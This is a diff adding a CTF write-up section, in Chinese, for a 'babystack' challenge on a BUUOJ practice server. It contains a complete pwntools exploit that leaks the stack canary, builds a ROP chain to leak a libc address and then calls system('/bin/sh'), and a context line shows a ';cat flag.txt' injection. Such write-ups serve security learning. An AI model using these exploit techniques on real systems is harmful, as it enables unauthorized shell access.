@@ -900,3 +900,48 @@ send_payload(payload)
 p.sendline(f';cat flag.txt')
 p.interactive()
 ```
+
+### others_babystack
+
+开启canary保护，需要先leak出canary的值。一开始我以为0x100-0x90等于0x10只能刚好覆盖RA>_<，不知道怎么ROP，真是机智死了~
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './babystack'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 25313)
+e = ELF(filename)
+# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('/home/ubuntu/glibc-lib/ubuntu_16_x86_64_libc-2.23.so')
+
+pop_rdi_ret = 0x0000000000400a93
+ret = 0x000000000040067e
+main = 0x00400908
+
+p.sendlineafter(b'>> ', b'1')
+p.send(b'a'*(0x90-8)+b'X')
+
+p.sendlineafter(b'>> ', b'2')
+p.recvuntil(b'aaaaX')
+canary = b'\x00'+p.recv(7)
+
+log.success(f'canary={canary}')
+p.sendlineafter(b'>> ', b'1')
+c_func_name = 'puts'
+
+p.send(b'b'*(0x90-8)+canary+p64(0x00400a30)+p64(pop_rdi_ret)+p64(e.got[c_func_name])+p64(e.plt[c_func_name])+p64(main))
+
+p.sendlineafter(b'>> ', b'3')
+c_func_addr = u64(p.recv(6).ljust(8, b'\x00'))
+libc_base = c_func_addr - libc.sym[c_func_name]
+system_addr = libc_base + libc.sym['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+log.success(f'{c_func_name}={hex(c_func_addr)}, base={hex(libc_base)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+
+p.sendlineafter(b'>> ', b'1')
+p.send(b'c'*(0x90-8)+canary+p64(0x00400a30)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)+p64(main))
+p.sendlineafter(b'>> ', b'3')
+p.interactive()
+```
